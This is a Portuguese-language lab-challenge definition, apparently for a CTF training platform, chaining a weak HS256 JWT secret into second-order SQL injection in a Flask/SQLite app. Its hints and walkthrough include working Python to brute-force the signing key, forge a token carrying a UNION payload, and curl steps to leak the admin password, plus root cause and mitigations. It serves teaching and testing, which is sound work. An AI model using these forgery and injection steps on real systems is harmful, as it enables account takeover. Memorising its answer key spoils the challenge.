@@ -1,0 +1,85 @@
+{
+  "slug": "chain-jwt-to-sqli",
+  "title": "Assinado para dentro do banco",
+  "codename": "ORCHARD TENANCY",
+  "summary": "O Orchard assina JWTs HS256 com um segredo que aparece na própria wordlist, e sua API de tenancy concatena a claim `sub` verificada dentro do SQL. Uma regra de borda bloqueia palavras-chave SQL na query string, então a injeção precisa viajar dentro de um token reassinado — e a tabela da equipe entrega a senha do admin.",
+  "category": "chain",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "chain-jwt-to-sqli",
+  "estimated_minutes": 40,
+  "xp": 310,
+  "tech": [
+    "Flask",
+    "JWT",
+    "SQLite",
+    "HMAC",
+    "Second-order injection"
+  ],
+  "tags": [
+    "chaining",
+    "jwt",
+    "weak-secret",
+    "sqli",
+    "second-order",
+    "account-takeover"
+  ],
+  "story": "O Orchard Tenancy oferece aos locadores um pequeno portal para notas da equipe e de locatários. Os tokens de acesso são JWTs assinados cuja chave o time audita contra uma wordlist pública — a mesma wordlist servida pela aplicação em /static/wordlist.txt. A API de tenancy confia no subject assinado o suficiente para colá-lo em uma instrução SQL, e mantém todas as senhas da equipe ao lado das notas de locatários no mesmo arquivo SQLite. Um proxy de borda remove palavras-chave SQL da query string, e é por isso que ninguém notou a API até agora.",
+  "objective": "Quebre o segredo de assinatura do JWT a partir da wordlist do lab, forje um token cujo subject carrega uma injeção UNION, leia a senha do admin pela API de tenancy, faça login como admin e colete a flag de operações.",
+  "rules": "Fique na origem loopback atribuída. A conta de agente da demonstração é `agent` / `Orchard-2026!`; apenas a conta de admin e a flag ficam fora dos limites até que a corrente chegue a elas. Resete o lab para regenerar a senha do admin. As flags são dinâmicas e têm o estado verificado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de operações do Orchard",
+      "flag_type": "root",
+      "points": 310,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Audite a chave de assinatura",
+      "body": "Faça login como `agent` e guarde o `orchard_token`. `/static/wordlist.txt` é a lista de auditoria de chaves: pegue o header e o payload do seu token e recalcule o HMAC-SHA256 para cada palavra.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "O subject vai direto para o SQL",
+      "body": "`/api/notes` e `/notes` executam `... WHERE username = '<sub>'` com o `sub` verificado. Um UNION selecionando quatro colunas de `staff` cabe no schema de locatários.",
+      "cost": 25
+    },
+    {
+      "level": 3,
+      "title": "O WAF só vê a URL",
+      "body": "O proxy de borda rejeita `union`/`select`/`from` na query string, não no seu cookie. Forje `sub` = `x' UNION SELECT username, password, 0, role FROM staff--`, assine com a chave quebrada e envie como cookie `orchard_token` para `/api/notes`. Faça login como `admin` com a senha vazada e abra `/notes`.",
+      "cost": 35
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — obtenha um token.**\n\n```bash\ncurl -s -c jar -X POST http://127.0.0.1:PORT/login -d 'username=agent&password=Orchard-2026!'\nTOKEN=$(grep orchard_token jar | awk '{print $7}')\n```\n\n**Etapa 2 — quebre o segredo HS256 offline.**\n\n```bash\ncurl -s http://127.0.0.1:PORT/static/wordlist.txt > words.txt\npython3 - <<'PY'\nimport hmac, hashlib, base64, sys\ntok = open('token.txt').read().strip()\nh, p, s = tok.split('.')\nb64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()\nfor w in open('words.txt').read().split():\n    if hmac.compare_digest(b64(hmac.new(w.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()), s):\n        print('secret:', w)\nPY\n# secret: sunshine\n```\n\n**Etapa 3 — forje um token carregando SQL.** A borda bloqueia `union`/`select`/`from` na query string, então coloque o payload no subject assinado:\n\n```bash\npython3 - <<'PY'\nimport hmac, hashlib, base64, json\nb64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()\nheader = b64(json.dumps({'alg':'HS256','typ':'JWT','kid':'default'}, separators=(',',':')).encode())\nclaims = {'sub': \"x' UNION SELECT username, password, 0, role FROM staff--\", 'role':'user', 'iat':0, 'exp':4102444800}\nbody = header + '.' + b64(json.dumps(claims, separators=(',',':')).encode())\nprint(body + '.' + b64(hmac.new(b'sunshine', body.encode(), hashlib.sha256).digest()))\nPY\ncurl -s http://127.0.0.1:PORT/api/notes -H \"Cookie: orchard_token=$FORGED\"\n# {\"count\":3,\"rows\":[{\"username\":\"admin\",\"property\":\"<admin password>\",...}]}\n```\n\n`sqlite3.Row` mantém os nomes originais das colunas, então os valores do UNION aparecem como `username` (equipe.username) e `property` (equipe.password).\n\n**Etapa 4 — assuma a conta de admin.**\n\n```bash\ncurl -s -c admin -X POST http://127.0.0.1:PORT/login -d 'username=admin&password=<leaked password>'\ncurl -s -b admin http://127.0.0.1:PORT/notes\n# <pre>RV{...}</pre>\n```\n\n**Caminhos errados:** `/api/notes?q=x' UNION SELECT ...` retorna `403` da borda, e um bypass booleano (`username=admin'--`) ainda precisa da senha — o UNION sobre `staff` é a única rota.",
+    "root_cause": "A primeira falha é uma chave de assinatura fraca e adivinhável para HS256: uma palavra de dicionário publicada pela própria aplicação torna o brute force offline trivial, o que converte cada claim — inclusive `sub` — em entrada controlada pelo atacante. A segunda falha é SQL injection de segunda ordem: a aplicação verifica o token e depois confia no subject decodificado o suficiente para interpolá-lo em uma query string. Como a checagem de fronteira roda na URL (uma regra de palavras-chave na borda), ela protege a camada errada; o payload viaja no cookie e volta a entrar no banco. Guardar senhas da equipe em texto claro ao lado de notas de locatários faz com que uma única primitiva de leitura resulte em account takeover imediato, e a sessão de admin é a flag.",
+    "mitigation": "Use um segredo longo e aleatório vindo de um key manager (ou RS256 assimétrico com JWKS publicados) e nunca um vindo de uma wordlist; rotacione em caso de suspeita e fixe o `alg` no servidor. Trate toda claim como não confiável: parametrize a query (`WHERE username = ?`) e nunca construa SQL a partir de dados do token. Aplique autorização no servidor (limite a API às próprias linhas do chamador) em vez de depender de filtros de palavras-chave na borda, que são trivialmente contornados por encodings e caminhos de segunda ordem. Armazene senhas com Argon2/bcrypt e separe tabelas privilegiadas dos dados de locatários; gere alertas para tokens cujas claims contenham sintaxe SQL."
+  },
+  "references": [
+    {
+      "title": "PortSwigger Web Security Academy — JWT attacks",
+      "url": "https://portswigger.net/web-security/jwt",
+      "source_type": "official",
+      "description": "Quebra de chaves fracas, forja de assinatura e confiança em claims de tokens verificados."
+    },
+    {
+      "title": "OWASP — SQL Injection Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Queries parametrizadas e por que a filtragem de entrada sozinha falha na injeção de segunda ordem."
+    },
+    {
+      "title": "CWE-20: Improper Input Validation",
+      "url": "https://cwe.mitre.org/data/definitions/20.html",
+      "source_type": "standard",
+      "description": "A classe de fraqueza que origina a confiança em claims de token assinado como entrada SQL."
+    }
+  ]
+}
